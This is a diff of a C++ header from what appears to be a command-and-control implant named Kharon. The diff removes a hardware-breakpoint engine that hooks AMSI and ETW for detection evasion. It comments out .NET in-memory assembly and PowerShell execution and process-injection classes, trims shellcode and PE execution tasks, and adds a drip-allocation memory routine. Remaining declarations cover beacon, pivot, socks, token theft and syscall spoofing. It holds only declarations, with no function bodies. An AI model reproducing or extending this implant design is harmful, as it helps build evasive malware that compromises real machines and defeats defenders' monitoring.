@@ -178,13 +178,10 @@ class Coff;
 class Beacon;
 class Spoof;
 class Syscall;
-class HwbpEng;
 class Jobs;
 class Useful;
-class Dotnet;
 class Memory;
 class Mask;
-class Injection;
 class Package;
 class Parser;
 class Task;
@@ -200,7 +197,10 @@ class Socket;
 #define x64_OPCODE_MOV			0xB8
 #define	x64_SYSCALL_STUB_SIZE   0x20
 
-#define SYSCALL_FLAGS Self->KH_SYSCALL_FLAGS
+#ifndef SYSCALL_FLAGS
+#define SYSCALL_FLAGS 0
+#endif
+
 #define SYSCALL_INDIRECT 0x100
 #define SYSCALL_SPOOF    0x250
 
@@ -235,13 +235,11 @@ namespace Root {
         Pivot*     Pvt;
         Beacon*    Bc;
         Coff*      Cf;
-        HwbpEng*   Hw;
         Spoof*     Spf;
         Syscall*   Sys;
         Socket*    Sckt;
         Jobs*      Jbs;
         Useful*    Usf;
-        Dotnet*    Dot;
         Library*   Lib;
         Token*     Tkn;
         Heap*      Hp;
@@ -251,11 +249,15 @@ namespace Root {
         Task*      Tk;
         Transport* Tsp;
         Mask*      Mk;
-        Injection* Inj;
         Parser*    Psr;
         Package*   Pkg;
     
-        UINT8 KH_SYSCALL_FLAGS;
+        UINT8 KH_SYSCALL_FLAGS = SYSCALL_FLAGS;
+
+        struct {
+            ULONG Alloc;
+            ULONG Write;
+        } Inj;
 
         struct {
             ULONG AllocGran;
@@ -904,13 +906,11 @@ namespace Root {
 
         VOID InitCrypt( Crypt* CryptRf ) { Crp = CryptRf; }
         VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
-        VOID InitHwbp( HwbpEng* HwbpRf ) { Hw = HwbpRf; }
         VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
         VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
         VOID InitSocket( Socket* SocketRf ) { Sckt = SocketRf; }
         VOID InitJobs( Jobs* JobsRf ) { Jbs = JobsRf; }
         VOID InitUseful( Useful* UsefulRf ) { Usf = UsefulRf; }
-        VOID InitDotnet( Dotnet* DotnetRf ) { Dot = DotnetRf; }
         VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
         VOID InitHeap( Heap* HeapRf ) { Hp = HeapRf; } 
         VOID InitLibrary( Library* LibRf ) { Lib = LibRf; }
@@ -921,7 +921,6 @@ namespace Root {
         VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
         VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
         VOID InitMask( Mask* MaskRf ) { Mk = MaskRf; }
-        VOID InitInjection( Injection* InjectionRf ) { Inj = InjectionRf; }
         VOID InitMemory( Memory* MemoryRf ) { Mm = MemoryRf; }
     };
 }
@@ -1461,153 +1460,6 @@ public:
     ) -> BOOL;
 };
 
-class HwbpEng {
-private:
-    Root::Kharon* Self;
-public:
-    HwbpEng( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
-
-    DESCRIPTOR_HOOK*      Threads = nullptr;
-    RTL_CRITICAL_SECTION* Crt     = nullptr;
-    CRITICAL_SECTION*     CritSec = nullptr;
-
-    INT32 DotnetBypass = KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET;
-    BOOL  Initialized  = FALSE;
-    PVOID Handler      = nullptr;
-
-    struct {
-        PVOID Parameter;
-        ULONG TimerWait;
-    } HookCallbackArg;
-
-    struct {
-        UPTR NtTraceEvent;
-    } Etw = {
-        .NtTraceEvent = NULL
-    };
-
-    struct {
-        UPTR Handle;
-        UPTR AmsiScanBuffer;
-    } Amsi = {
-        .Handle = NULL,
-        .AmsiScanBuffer = NULL
-    };
-
-    auto Init( VOID ) -> BOOL;
-    auto Clean( VOID ) -> BOOL;
-
-    auto SetDr7(
-        _In_ UPTR ActVal,
-        _In_ UPTR NewVal,
-        _In_ INT  StartPos,
-        _In_ INT  BitsCount
-    ) -> UPTR;
-
-    auto Install(
-        _In_ UPTR  Address,
-        _In_ INT8  Drx,
-        _In_ PVOID Callback,
-        _In_ ULONG ThreadID
-    ) -> BOOL;
-
-    auto SetBreak(
-        _In_ ULONG ThreadID,
-        _In_ UPTR  Address,
-        _In_ INT8  Drx,
-        _In_ BOOL  Init
-    ) -> BOOL;
-
-    auto Uninstall(
-        _In_ UPTR  Address,
-        _In_ ULONG ThreadID
-    ) -> BOOL;
- 
-    auto GetArg(
-        _In_ PCONTEXT Ctx,
-        _In_ ULONG    Idx
-    ) -> UPTR;
-
-    auto SetArg(
-        _In_ PCONTEXT Ctx,
-        _In_ UPTR     Val,
-        _In_ ULONG    Idx
-    ) -> VOID;
-
-    auto BlockReal(
-        _In_ PCONTEXT Ctx
-    ) -> VOID;
-
-    auto Insert(
-        _In_ UPTR  Address,
-        _In_ INT8  Drx,
-        _In_ BOOL  Init,
-        _In_ ULONG ThreadID
-    ) -> BOOL;
-
-    auto HookCallback(
-        _In_ PVOID Parameter,
-        _In_ BOOL  TimerWait
-    ) -> VOID;
-
-    __forceinline auto static DECLFN HookCallbackThunk(
-        _In_ PVOID This
-    ) -> VOID {
-        This = NtCurrentPeb()->TelemetryCoverageHeader;
-        return static_cast<Root::Kharon*>( This )->Hw->HookCallback( static_cast<Root::Kharon*>( This )->Hw->HookCallbackArg.Parameter, static_cast<Root::Kharon*>( This )->Hw->HookCallbackArg.TimerWait );
-    }
-
-    auto MainHandler( 
-        _In_ PEXCEPTION_POINTERS e 
-    ) -> LONG;
-
-    __forceinline static auto MainThunk(
-        _In_ PEXCEPTION_POINTERS e,
-        _In_ PVOID               This
-    ) -> LONG {
-        This = NtCurrentPeb()->TelemetryCoverageHeader;
-        return static_cast<Root::Kharon*>( This )->Hw->MainHandler( e );
-    }
-
-    auto AddNewThreads(
-        _In_ INT8 Drx
-    ) -> BOOL;
-
-    auto RmNewThreads(
-        _In_ INT8 Drx
-    ) -> BOOL;    
-
-    auto NtCreateThreadExHk(
-        _In_ PCONTEXT Ctx
-    ) -> VOID;
-
-    static auto NtCreateThreadExHkThunk(
-        _In_ PCONTEXT Ctx,
-        _In_ PVOID    This 
-    ) -> VOID;
-
-    auto DotnetInit( VOID ) -> BOOL;
-    auto DotnetExit( VOID ) -> BOOL;
-
-    auto EtwDetour(
-        _In_ PCONTEXT Ctx
-    ) -> VOID;
-
-    auto AmsiDetour(
-        _In_ PCONTEXT Ctx
-    ) -> VOID;    
-
-    static auto EtwThunk(
-        _In_ PCONTEXT Ctx,
-        _In_ PVOID    This 
-    ) -> VOID;
-
-    static auto AmsiThunk(
-        _In_ PCONTEXT Ctx,
-        _In_ PVOID    This 
-    ) -> VOID;
-};
-
 class Jobs {
 private:
     Root::Kharon* Self;
@@ -1647,98 +1499,98 @@ public:
     ) -> BOOL;
 };
 
-class Dotnet {
-private:
-    Root::Kharon* Self;
-public:
-    Dotnet( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+// class Dotnet {
+// private:
+//     Root::Kharon* Self;
+// public:
+//     Dotnet( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    struct {
-        CLSID CLRMetaHost;
-        CLSID CorRuntimeHost;
-    } CLSID = {
-        .CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
-        .CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
-    };
+//     struct {
+//         CLSID CLRMetaHost;
+//         CLSID CorRuntimeHost;
+//     } CLSID = {
+//         .CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
+//         .CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
+//     };
 
-    struct {
-        IID MscorlibAsm;
-        IID IHostControl;
-        IID AppDomain;
-        IID ICLRMetaHost;
-        IID ICLRRuntimeInfo;
-        IID ICorRuntimeHost;
-        IID IDispatch;
-    } IID = {
-        .MscorlibAsm      = { 0x17156360, 0x2F1A, 0x384A, { 0xBC, 0x52, 0xFD, 0xE9, 0x3C, 0x21, 0x5C, 0x5B } },
-        .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
-        .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
-        .ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
-        .ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
-        .ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
-        .IDispatch        = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } }
-    };
+//     struct {
+//         IID MscorlibAsm;
+//         IID IHostControl;
+//         IID AppDomain;
+//         IID ICLRMetaHost;
+//         IID ICLRRuntimeInfo;
+//         IID ICorRuntimeHost;
+//         IID IDispatch;
+//     } IID = {
+//         .MscorlibAsm      = { 0x17156360, 0x2F1A, 0x384A, { 0xBC, 0x52, 0xFD, 0xE9, 0x3C, 0x21, 0x5C, 0x5B } },
+//         .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
+//         .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
+//         .ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
+//         .ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
+//         .ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
+//         .IDispatch        = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } }
+//     };
 
-    struct {
-        ULONG  s; // size
-        PCHAR  p; // pointer
-    } Out = {
-        .s = 0,
-        .p = nullptr
-    };
+//     struct {
+//         ULONG  s; // size
+//         PCHAR  p; // pointer
+//     } Out = {
+//         .s = 0,
+//         .p = nullptr
+//     };
 
-    struct {
-        ULONG  ID;
-        PWCHAR AppDomain;
-        PWCHAR AssemblyName;
-    } Invoke[5] = {};
+//     struct {
+//         ULONG  ID;
+//         PWCHAR AppDomain;
+//         PWCHAR AssemblyName;
+//     } Invoke[5] = {};
 
-    BOOL KeepLoad   = FALSE;
-    BOOL ExitBypass = FALSE;
+//     BOOL KeepLoad   = FALSE;
+//     BOOL ExitBypass = FALSE;
 
-    auto CreateVariantCmd(
-        WCHAR* Command
-    ) -> VARIANT;
+//     auto CreateVariantCmd(
+//         WCHAR* Command
+//     ) -> VARIANT;
     
-    auto CreateSafeArray(
-        VARIANT* Args, 
-        UINT     Argc
-    ) -> SAFEARRAY*;
+//     auto CreateSafeArray(
+//         VARIANT* Args, 
+//         UINT     Argc
+//     ) -> SAFEARRAY*;
 
-    auto GetAssemblyLoaded(
-        _In_  IAppDomain* AppDomain,
-        _In_  WCHAR*      AsmName1,
-        _In_  GUID        AsmIID, 
-        _Out_ IAssembly** Assembly
-    ) -> HRESULT;
+//     auto GetAssemblyLoaded(
+//         _In_  IAppDomain* AppDomain,
+//         _In_  WCHAR*      AsmName1,
+//         _In_  GUID        AsmIID, 
+//         _Out_ IAssembly** Assembly
+//     ) -> HRESULT;
 
-    auto GetMethodType(
-        _In_  IBindingFlags Flags,
-        _In_  IType*        MType,
-        _In_  BSTR          MethodInp,
-        _Out_ IMethodInfo** MethodRef
-    ) -> HRESULT;
+//     auto GetMethodType(
+//         _In_  IBindingFlags Flags,
+//         _In_  IType*        MType,
+//         _In_  BSTR          MethodInp,
+//         _Out_ IMethodInfo** MethodRef
+//     ) -> HRESULT;
 
-    auto PatchExit(
-        _In_ ICorRuntimeHost* IRuntime
-    ) -> HRESULT;
+//     auto PatchExit(
+//         _In_ ICorRuntimeHost* IRuntime
+//     ) -> HRESULT;
 
-    auto VersionList( VOID ) -> VOID;
+//     auto VersionList( VOID ) -> VOID;
 
-    auto Inline(
-        _In_ BYTE* AsmBytes,
-        _In_ ULONG AsmLength,
-        _In_ PWSTR Arguments,
-        _In_ PWSTR AppDomName,
-        _In_ PWSTR Version,
-        _In_ BOOL  KeepLoad
-    ) -> BOOL;
+//     auto Inline(
+//         _In_ BYTE* AsmBytes,
+//         _In_ ULONG AsmLength,
+//         _In_ PWSTR Arguments,
+//         _In_ PWSTR AppDomName,
+//         _In_ PWSTR Version,
+//         _In_ BOOL  KeepLoad
+//     ) -> BOOL;
 
-    auto Pwsh(
-        _In_     WCHAR* Command,
-        _In_opt_ BYTE*  Script
-    ) -> HRESULT;
-};
+//     auto Pwsh(
+//         _In_     WCHAR* Command,
+//         _In_opt_ BYTE*  Script
+//     ) -> HRESULT;
+// };
 
 class Useful {
 private:
@@ -2177,23 +2029,11 @@ public:
         _In_ JOBS* Job
     ) -> ERROR_CODE;
 
-    auto ExecPE( 
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto ExecSc( 
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
     auto Process( 
         _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto FileSystem( 
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Dotnet(
         _In_ JOBS* Job
     ) -> ERROR_CODE;
 
@@ -2214,16 +2054,13 @@ public:
         Mgmt[0].ID = TskExit,       Mgmt[0].Run = &Task::Exit,
         Mgmt[1].ID = TskFileSystem, Mgmt[1].Run = &Task::FileSystem,
         Mgmt[2].ID = TskProcess,    Mgmt[2].Run = &Task::Process,
-        Mgmt[4].ID = TskExecBof,    Mgmt[4].Run = &Task::ExecBof,
-        Mgmt[5].ID = TskExecSc,     Mgmt[5].Run = &Task::ExecSc,
-        Mgmt[6].ID = TskConfig,     Mgmt[6].Run = &Task::Config,
-        Mgmt[7].ID = TskDownload,   Mgmt[7].Run = &Task::Download,
-        Mgmt[8].ID = TskUpload,     Mgmt[8].Run = &Task::Upload,
-        Mgmt[9].ID = TskDotnet,     Mgmt[9].Run = &Task::Dotnet,
-        Mgmt[10].ID = TskSocks,     Mgmt[10].Run = &Task::Socks,
-        Mgmt[11].ID = TskExecPE,    Mgmt[11].Run = &Task::ExecPE,
-        Mgmt[12].ID = TskToken,     Mgmt[12].Run = &Task::Token,
-        Mgmt[12].ID = TskPivot,     Mgmt[12].Run = &Task::Pivot
+        Mgmt[3].ID = TskExecBof,    Mgmt[3].Run = &Task::ExecBof,
+        Mgmt[4].ID = TskConfig,     Mgmt[4].Run = &Task::Config,
+        Mgmt[5].ID = TskDownload,   Mgmt[5].Run = &Task::Download,
+        Mgmt[6].ID = TskUpload,     Mgmt[6].Run = &Task::Upload,
+        Mgmt[7].ID = TskSocks,      Mgmt[7].Run = &Task::Socks,
+        Mgmt[8].ID = TskToken,      Mgmt[8].Run = &Task::Token,
+        Mgmt[9].ID = TskPivot,      Mgmt[9].Run = &Task::Pivot
     };
 };
 
@@ -2448,7 +2285,15 @@ public:
         _In_ SIZE_T Size,
         _In_ ULONG  AllocType,
         _In_ ULONG  Protect,
-        _In_ HANDLE Handle = nullptr
+        _In_ HANDLE Handle = NtCurrentProcess()
+    ) -> PVOID;
+
+    auto DripAlloc(
+        _In_  PVOID   Base,
+        _In_  SIZE_T  Size,
+        _In_  ULONG   AllocType,
+        _In_  ULONG   Protect,
+        _In_  HANDLE  Handle = NtCurrentProcess()
     ) -> PVOID;
 
     auto Protect(
@@ -2456,14 +2301,14 @@ public:
         _In_  SIZE_T Size,
         _In_  ULONG  NewProt,
         _Out_ ULONG *OldProt,
-        _In_  HANDLE Handle = nullptr
+        _In_  HANDLE Handle = NtCurrentProcess()
     ) -> BOOL;
 
     auto Write(
         _In_ PVOID  Base,
         _In_ BYTE*  Buffer,
         _In_ ULONG  Size,
-        _In_ HANDLE Handle = nullptr
+        _In_ HANDLE Handle = NtCurrentProcess()
     ) -> BOOL;
 
     auto WriteAPC(
@@ -2478,14 +2323,14 @@ public:
         _In_  BYTE*   Buffer,
         _In_  SIZE_T  Size,
         _Out_ SIZE_T* Reads,
-        _In_ HANDLE Handle = nullptr
+        _In_ HANDLE Handle = NtCurrentProcess()
     ) -> BOOL;
 
     auto Free(
         _In_ PVOID  Base,
         _In_ SIZE_T Size,
         _In_ ULONG  FreeType,
-        _In_ HANDLE Handle = nullptr
+        _In_ HANDLE Handle = NtCurrentProcess()
     ) -> BOOL;
 
     auto MapView(
@@ -2572,70 +2417,70 @@ typedef struct _INJECTION_NODE {
     struct _INJECTION_NODE* Next;
 } INJECTION_NODE, *PINJECTION_NODE;
 
-class Injection {
-private:
-    Root::Kharon* Self;
-public:
-    Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+// class Injection {
+// private:
+//     Root::Kharon* Self;
+// public:
+//     Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    PINJECTION_NODE Node = nullptr;
+//     PINJECTION_NODE Node = nullptr;
 
-    struct {
-        struct {
-            UINT8 TechniqueID;
-        } PE;
+//     struct {
+//         struct {
+//             UINT8 TechniqueID;
+//         } PE;
 
-        struct {
-            UINT8 TechniqueID;
-        } Sc; 
+//         struct {
+//             UINT8 TechniqueID;
+//         } Sc; 
 
-        struct {
-            BOOL  b;
-            ULONG s;
-            PVOID p;
-        } Pipe;
+//         struct {
+//             BOOL  b;
+//             ULONG s;
+//             PVOID p;
+//         } Pipe;
 
-        struct {
-            ULONG s;
-            BYTE* p;
-        } Param;
+//         struct {
+//             ULONG s;
+//             BYTE* p;
+//         } Param;
         
-        BOOL Spawn;
+//         BOOL Spawn;
 
-    } Ctx = {
-        .PE = { .TechniqueID = PeReflection },
-        .Sc = { .TechniqueID = KH_INJECTION_SC }
-    };
+//     } Ctx = {
+//         .PE = { .TechniqueID = PeReflection },
+//         .Sc = { .TechniqueID = KH_INJECTION_SC }
+//     };
 
-    auto Shellcode(
-        _In_ ULONG ProcessID,
-        _In_ BYTE* Buffer,
-        _In_ UPTR  Size,
-        _In_ PVOID Param
-    ) -> BOOL;
+//     auto Shellcode(
+//         _In_ ULONG ProcessID,
+//         _In_ BYTE* Buffer,
+//         _In_ UPTR  Size,
+//         _In_ PVOID Param
+//     ) -> BOOL;
 
-    auto Classic(
-        _In_  ULONG  ProcessID,
-        _In_  BYTE*  Buffer,
-        _In_  UPTR   Size,
-        _In_  PVOID  Param,
-        _Out_ PVOID &Base
-    ) -> BOOL;
+//     auto Classic(
+//         _In_  ULONG  ProcessID,
+//         _In_  BYTE*  Buffer,
+//         _In_  UPTR   Size,
+//         _In_  PVOID  Param,
+//         _Out_ PVOID &Base
+//     ) -> BOOL;
 
-    auto Stomp(
-        _In_  ULONG ProcessID,
-        _In_  BYTE* Buffer,
-        _In_  UPTR  Size,
-        _In_  PVOID Param,
-        _Out_ PVOID &Base
-    ) -> BOOL;
+//     auto Stomp(
+//         _In_  ULONG ProcessID,
+//         _In_  BYTE* Buffer,
+//         _In_  UPTR  Size,
+//         _In_  PVOID Param,
+//         _Out_ PVOID &Base
+//     ) -> BOOL;
 
-    auto Reflection(
-        _In_ BYTE*  Buffer,
-        _In_ ULONG  Size,
-        _In_ PVOID  Param
-    ) -> BOOL;
-};
+//     auto Reflection(
+//         _In_ BYTE*  Buffer,
+//         _In_ ULONG  Size,
+//         _In_ PVOID  Param
+//     ) -> BOOL;
+// };
 
 class ProcThreadAttrList: public Root::Kharon {
 private:
